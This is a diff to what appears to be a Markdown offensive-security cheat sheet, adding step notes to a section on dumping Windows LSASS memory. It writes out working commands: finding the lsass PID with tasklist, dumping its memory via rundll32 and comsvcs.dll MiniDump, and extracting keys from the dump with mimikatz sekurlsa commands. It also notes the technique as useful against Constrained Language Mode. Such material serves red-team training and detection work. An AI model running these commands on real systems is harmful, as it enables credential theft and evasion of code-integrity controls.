@@ -85,12 +85,26 @@ pypykatz.exe live lsa
 
 **Using comsvcs.dll**
 
+- Very useful in case of Constrained Language Mode / Code Integrity Enforcement
+
+- First get the PID of the `lsass.exe` process: 
+
 ```
 tasklist /FI "IMAGENAME eq lsass.exe"
 ```
 
+- Do a memory dump of the `lsass.exe` process:
+
 ```
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass PID> C:\Users\Public\lsass.dump full
+```
+
+- To get the credentials in the dump, use `mimikatz.exe`:
+
+```
+sekurlsa::minidump <path_to_dmp>
+privilege::debug
+sekurlsa::ekeys
 ```
 
 <br/>
